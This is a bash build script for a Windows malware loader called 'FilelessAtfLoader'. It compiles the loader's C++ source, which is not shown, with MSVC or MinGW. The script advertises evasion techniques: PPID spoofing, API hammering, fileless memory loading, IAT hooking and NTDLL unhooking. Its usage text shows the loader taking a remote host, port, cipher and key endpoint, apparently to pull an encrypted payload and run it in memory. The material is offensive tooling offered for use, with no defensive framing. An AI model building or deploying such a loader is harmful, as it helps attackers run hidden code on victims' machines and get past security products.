#!/bin/bash

echo "[+] FilelessAtfLoader - Compilation script"
echo "[+] Included Améliorations:"
echo "    ✓ PPID Spoofing"
echo "    ✓ API Hammering"
echo ""

if command -v cl.exe &> /dev/null; then
    echo "[+] Utilisation de MSVC (Visual Studio)"
    
    cl.exe /EHsc /O2 \
        FilelessAtfLoader/FilelessAtfLoader.cpp \
        /link kernel32.lib user32.lib advapi32.lib psapi.lib winhttp.lib crypt32.lib ntdll.lib \
        /OUT:FilelessAtfLoader.exe
        
elif command -v x86_64-w64-mingw32-g++ &> /dev/null; then
    echo "[+] Utilisation de MinGW (Cross-compilation)"
    
    x86_64-w64-mingw32-g++ -O2 -std=c++11 \
        FilelessAtfLoader/FilelessAtfLoader.cpp \
        -o FilelessAtfLoader.exe \
        -lkernel32 -luser32 -ladvapi32 -lpsapi -lwinhttp -lcrypt32 -lntdll \
        -static-libgcc -static-libstdc++
        
else
    echo "[-] Error: No Windows compiler found"
    echo "    Install Visual Studio ou MinGW-w64"
    exit 1
fi

if [ -f "FilelessAtfLoader.exe" ]; then
    echo ""
    echo "[+] ✓ Compilation finished!"
    echo "[+] Executable: FilelessAtfLoader.exe"
    echo ""
    echo "[+] Usage:"
    echo "    FilelessAtfLoader.exe <host> <port> <cipher_type> <key_endpoint>"
    echo ""
    echo "    Cipher types supported:"
    echo "    - AES (original)"
    echo "    - CHACHA20 (nouveau, plus sécurisé)"
    echo ""
    echo "    Example:"
    echo "    FilelessAtfLoader.exe 192.168.1.100 8080 CHACHA20 /key"
    echo ""
    echo "[+] Active functionnalities:"
    echo "    ✓ PPID Spoofing vers explorer.exe"
    echo "    ✓ API Hammering"
    echo "    ✓ Fileless memory loading"
    echo "    ✓ IAT hooking for masquing"
    echo "    ✓ NTDLL unhooking"
else
    echo ""
    echo "[-] ❌ Compilation Error!"
    exit 1
fi
